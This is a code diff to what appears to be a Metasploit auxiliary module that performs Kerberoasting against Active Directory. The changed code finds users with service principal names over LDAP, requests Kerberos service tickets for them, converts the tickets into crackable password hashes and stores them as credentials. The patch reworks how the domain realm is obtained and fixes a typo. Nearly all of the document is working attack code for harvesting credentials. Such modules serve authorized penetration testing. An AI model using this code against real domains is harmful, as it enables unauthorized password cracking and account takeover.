@@ -6,6 +6,7 @@
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::Kerberos::Client
   include Msf::Exploit::Remote::LDAP
+  include Msf::Exploit::Remote::LDAP::ActiveDirectory
   include Msf::Exploit::Remote::LDAP::Queries
   include Msf::OptionalSession::LDAP
   include Msf::Exploit::Deprecated
@@ -57,7 +58,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run
-    if datastore['TARGET_USER'].nil?
+    if datastore['TARGET_USER'].blank?
       run_ldap
     else
       run_user
@@ -85,24 +86,24 @@ class MetasploitModule < Msf::Auxiliary
 
   def run_user
     verify_options
+
     user = datastore['TARGET_USER']
-    filter = "(&(objectClass=user)(sAMAccountName=#{Net::LDAP::Filter.escape(user)}))"
-    attributes = ['servicePrincipalName', 'sAMAccountName']
-    spn = nil
-    count = run_ldap_query(filter, attributes) do |result|
-      if result.respond_to?(:serviceprincipalname)
-        spn = result.serviceprincipalname[0]
-      end
+    realm = user_object = nil
+    ldap_connect do |ldap|
+      validate_bind_success!(ldap)
+      realm = adds_get_domain_info(ldap)[:dns_name]
+      user_object = adds_get_object_by_samaccountname(ldap, user)
     end
-    if count == 0
+
+    if user_object.nil?
       fail_with(Failure::BadConfig, "User #{user} not found")
-    elsif spn.nil?
+    elsif user_object[:serviceprincipalname].nil?
       fail_with(Failure::BadConfig, "User #{user} has no SPN")
     end
     begin
-      jtr = roast(user, spn)
+      jtr = roast(user, user_object[:serviceprincipalname].first, realm: realm)
       jtr_format = Metasploit::Framework::Hashes.identify_hash(jtr)
-      report_hash(jtr, jtr_format)
+      report_hash(jtr, jtr_format, realm: realm)
       print_good("Success: \n#{jtr}")
     rescue ::Rex::Proto::Kerberos::Model::Error::KerberosError => e
       print_error("#{user} reported as kerberoastable, but received error when attempting to retrieve TGS (#{e})")
@@ -113,17 +114,24 @@ class MetasploitModule < Msf::Auxiliary
     verify_options
     jtr_formats = Set.new
     hashes = []
-    run_builtin_ldap_query('ENUM_USER_SPNS_KERBEROAST') do |result|
-      spn = result.serviceprincipalname[0]
-      username = result.samaccountname[0]
-      begin
-        jtr = roast(username, spn)
-        hashes.append(jtr)
-        jtr_format = Metasploit::Framework::Hashes.identify_hash(jtr)
-        jtr_formats.add(jtr_format)
-        report_hash(jtr, jtr_format)
-      rescue ::Rex::Proto::Kerberos::Model::Error::KerberosError => e
-        print_error("#{username} reported as kerberoastable, but received error when attempting to retrieve TGS (#{e})")
+
+    realm = nil
+    ldap_connect do |ldap|
+      validate_bind_success!(ldap)
+      realm = adds_get_domain_info(ldap)[:dns_name]
+
+      run_builtin_ldap_query('ENUM_USER_SPNS_KERBEROAST') do |result|
+        spn = result.serviceprincipalname[0]
+        username = result.samaccountname[0]
+        begin
+          jtr = roast(username, spn, realm: realm)
+          hashes.append(jtr)
+          jtr_format = Metasploit::Framework::Hashes.identify_hash(jtr)
+          jtr_formats.add(jtr_format)
+          report_hash(jtr, jtr_format, realm: realm)
+        rescue ::Rex::Proto::Kerberos::Model::Error::KerberosError => e
+          print_error("#{username} reported as kerberoastable, but received error when attempting to retrieve TGS (#{e})")
+        end
       end
     end
     if hashes.empty?
@@ -135,14 +143,14 @@ class MetasploitModule < Msf::Auxiliary
 
     if jtr_formats.length > 1
       print_warning('NOTE: Multiple encryption types returned - will require separate cracking runs for each type.')
-      print_status('To obtain the crackable values for a praticular type, run `creds`:')
+      print_status('To obtain the crackable values for a particular type, run `creds`:')
       jtr_formats.each do |format|
         print_status("creds -t #{format} -O #{datastore['RHOST']} -o <outfile.(jtr|hcat)>")
       end
     end
   end
 
-  def roast(roasted, spn)
+  def roast(roasted, spn, realm:)
     components = spn.split('/')
     fail_with(Failure::UnexpectedReply, "Invalid SPN: #{spn}") unless components.length == 2
 
@@ -150,16 +158,14 @@ class MetasploitModule < Msf::Auxiliary
       name_type: Rex::Proto::Kerberos::Model::NameType::NT_SRV_INST,
       name_string: components
     )
-    # If we have a session set, we can use the login and domain information from it.
-    # But we need to let the user specify the KDC, as it might not be the Rhost the session is connected to
-    domain_name = session ? session.client.realm : datastore['LDAPDomain']
+
     rhostname = datastore['DomainControllerRhost']
     rhostname ||= session.client.peerhost if session
     username = session ? session.client.username : datastore['LDAPUsername']
     password = session ? session.client.password : datastore['LDAPPassword']
     authenticator = Msf::Exploit::Remote::Kerberos::ServiceAuthenticator::Base.new(
       host: rhostname,
-      realm: domain_name,
+      realm: realm,
       username: username,
       password: password,
       framework: framework,
@@ -189,7 +195,7 @@ class MetasploitModule < Msf::Auxiliary
     tgs_ticket, = authenticator.request_service_ticket(
       session_key,
       ticket,
-      domain_name.upcase,
+      realm.upcase,
       username,
       offered_etypes,
       expiry_time,
@@ -201,7 +207,7 @@ class MetasploitModule < Msf::Auxiliary
     format_tgs_rep_to_john_hash(tgs_ticket, roasted)
   end
 
-  def report_hash(hash, jtr_format)
+  def report_hash(hash, jtr_format, realm:)
     service_data = {
       address: rhost,
       port: rport,
@@ -216,7 +222,7 @@ class MetasploitModule < Msf::Auxiliary
       private_type: :nonreplayable_hash,
       jtr_format: jtr_format,
       realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,
-      realm_value: session ? session.client.realm : datastore['LDAPDomain']
+      realm_value: realm
     }.merge(service_data)
 
     credential_core = create_credential(credential_data)
